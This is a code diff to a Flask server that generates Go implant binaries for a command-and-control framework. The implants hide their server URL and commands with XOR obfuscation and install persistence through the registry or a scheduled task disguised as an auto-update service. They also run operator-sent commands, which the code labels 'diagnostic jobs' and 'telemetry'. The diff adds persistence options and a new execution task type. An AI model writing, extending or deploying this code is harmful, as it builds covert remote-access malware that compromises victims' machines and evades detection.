@@ -3,15 +3,15 @@ from werkzeug.utils import secure_filename
 from database import get_db_connection
 from crypto import generate_key, encrypt_payload, decrypt_payload
 from datetime import datetime, timezone
+import hmac
 import json
 import subprocess
 import shutil
 import tempfile
 import os
-import re
-import zipfile
 
 app = Flask(__name__)
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB upload limit
 
 # Swap out the default Werkzeug Server header so the stack isn't fingerprinted from traffic.
 @app.after_request
@@ -104,7 +104,8 @@ API_KEY = _init_api_key()
 def _require_api_key():
     """Gate every operator endpoint behind the API key."""
     if request.path.startswith("/api/"):
-        if request.headers.get("X-API-Key") != API_KEY:
+        provided = request.headers.get("X-API-Key", "")
+        if not hmac.compare_digest(provided, API_KEY):
             return jsonify({"error": "Unauthorized"}), 401
 
 
@@ -420,15 +421,6 @@ def get_stats():
 
 # -- build --
 
-def _sanitize_interval(interval_str):
-    """Validate and sanitize a Go time.Duration string like '10s', '1m', '30s'."""
-    pattern = r'^(\d+)(s|m|h)$'
-    match = re.match(pattern, interval_str.strip())
-    if not match:
-        return None
-    return interval_str.strip()
-
-
 def _xor_encrypt(key: bytes, plaintext: str) -> str:
     """XOR-encrypt a plaintext string with a multi-byte key, return hex."""
     pt = plaintext.encode()
@@ -456,7 +448,7 @@ def _compute_cert_pin():
     return hashlib.sha256(spki_bytes).hexdigest()
 
 
-def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
+def _generate_config_go(server_url, jitter_min, jitter_max, persist_method,
                         profile_id=1, locale="en-US,en;q=0.9",
                         key_hex="", key_id="",
                         path_checkin="/api/checkin", path_result="/api/result",
@@ -465,8 +457,10 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
     """Generate a config.go file with the given settings."""
 
     # fresh XOR key for this build
-    xor_key = os.urandom(16)
+    xor_key = os.urandom(32)
     xor_key_hex = xor_key.hex()
+
+    persistence = persist_method != "none"
 
     # encrypt sensitive strings so they don't show up as plaintext in the binary
     enc_server_url   = _xor_encrypt(xor_key, server_url)
@@ -477,6 +471,7 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
     enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
     enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")
     enc_cert_pin     = _xor_encrypt(xor_key, cert_pin) if cert_pin else ""
+    enc_update_strat = _xor_encrypt(xor_key, persist_method) if persistence else ""
 
     return f'''package main
 
@@ -506,6 +501,7 @@ var (
 	PathFiles         string
 	FlushCommand      string
 	ServiceTag        string
+	UpdateStrategy    string
 
 	SyncDelayMin  = {jitter_min} * time.Second
 	SyncDelayMax  = {jitter_max} * time.Second
@@ -550,6 +546,10 @@ func InitializeTelemetry() {{
 	FlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
 	ServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
 	funcs.ServiceLabel = ServiceTag
+	if "{enc_update_strat}" != "" {{
+		UpdateStrategy = funcs.ResolveConfig(obfKey, "{enc_update_strat}")
+		funcs.UpdateStrategy = UpdateStrategy
+	}}
 	if "{enc_cert_pin}" != "" {{
 		CertPin = funcs.ResolveConfig(obfKey, "{enc_cert_pin}")
 	}}
@@ -612,10 +612,10 @@ func InitializeTelemetry() {{
 '''
 
 
-def _generate_main_go(persistence):
+def _generate_main_go(persist_method):
     """Generate main.go, optionally with persistence call."""
     persist_block = ""
-    if persistence:
+    if persist_method != "none":
         persist_block = """
 \t// Register auto-update service
 \tif EnablePersist {{
@@ -656,6 +656,7 @@ type SyncResponse struct {{
 type DiagnosticJob struct {{
 	ID      int    `json:"id"`
 	Command string `json:"command"`
+	Type    string `json:"type"`
 }}
 
 type DiagnosticOutput struct {{
@@ -733,7 +734,16 @@ func main() {{
 			}}
 
 			go func(t DiagnosticJob) {{
-				output, execErr := funcs.ExecuteDiagnosticTask(t.Command)
+				var output string
+				var execErr error
+
+				switch t.Type {{
+				case "exec":
+					output, execErr = funcs.RunDiagnosticProbe(t.Command)
+				default:
+					output, execErr = funcs.ExecuteDiagnosticTask(t.Command)
+				}}
+
 				if execErr != nil && output == "" {{
 					output = fmt.Sprintf("Error: %v", execErr)
 				}}
@@ -815,7 +825,17 @@ func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
 		return nil, fmt.Errorf("post: %w", err)
 	}}
 	defer resp.Body.Close()
-	return io.ReadAll(resp.Body)
+
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {{
+		return nil, fmt.Errorf("read response: %w", err)
+	}}
+
+	if resp.StatusCode != 200 {{
+		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(respBody))
+	}}
+
+	return respBody, nil
 }}
 
 '''
@@ -834,7 +854,10 @@ def build_agent():
     server_url = data.get("server_url", "http://localhost:5000")
     jitter_min_raw = data.get("jitter_min", "8")
     jitter_max_raw = data.get("jitter_max", "15")
-    persistence = data.get("persistence", False)
+    persist_method = data.get("persist_method", "none")
+    valid_persist = ("none", "registry", "scheduled_task")
+    if persist_method not in valid_persist:
+        return jsonify({"error": f"persist_method must be one of: {', '.join(valid_persist)}"}), 400
     profile_id = data.get("profile_id", 1)
     locale = data.get("locale", "en-US,en;q=0.9")
 
@@ -842,6 +865,10 @@ def build_agent():
     valid_os = ["windows", "linux", "mac"]
     if target_os not in valid_os:
         return jsonify({"error": f"Invalid target_os. Must be one of: {valid_os}"}), 400
+
+    # macOS has no persistence implementation; reject at build time rather than silently failing at runtime
+    if target_os == "mac" and persist_method != "none":
+        return jsonify({"error": "macOS agents do not support persistence. Set persist_method to 'none'."}), 400
 
     # Validate architecture
     valid_arch = ["amd64", "arm64", "386"]
@@ -911,7 +938,7 @@ def build_agent():
 
         # Generate custom config.go
         config_content = _generate_config_go(
-            server_url, jitter_min, jitter_max, persistence, profile_id, locale,
+            server_url, jitter_min, jitter_max, persist_method, profile_id, locale,
             key_hex=key_hex, key_id=key_id,
             path_checkin=AGENT_PATH_CHECKIN,
             path_result=AGENT_PATH_RESULT,
@@ -923,7 +950,7 @@ def build_agent():
             f.write(config_content)
 
         # Generate main.go with optional persistence
-        main_content = _generate_main_go(persistence)
+        main_content = _generate_main_go(persist_method)
         with open(os.path.join(tmp_agent, "main.go"), "w", encoding="utf-8") as f:
             f.write(main_content)
 
@@ -973,7 +1000,7 @@ def build_agent():
         conn = get_db_connection()
         cursor = conn.execute(
             "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key, cert_pin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
-            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size, key_id, key_hex, cert_pin),
+            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", persist_method, final_path, file_size, key_id, key_hex, cert_pin),
         )
         build_id = cursor.lastrowid
         conn.commit()
@@ -1167,7 +1194,7 @@ def get_builds():
                 "arch": b["arch"],
                 "server_url": b["server_url"],
                 "callback_interval": b["callback_interval"],
-                "persistence": bool(b["persistence"]),
+                "persistence": b["persistence"] if b["persistence"] in ("none", "registry", "scheduled_task") else ("registry" if b["persistence"] else "none"),
                 "file_size": b["file_size"],
                 "cert_pin": b["cert_pin"],
                 "created_at": b["created_at"],
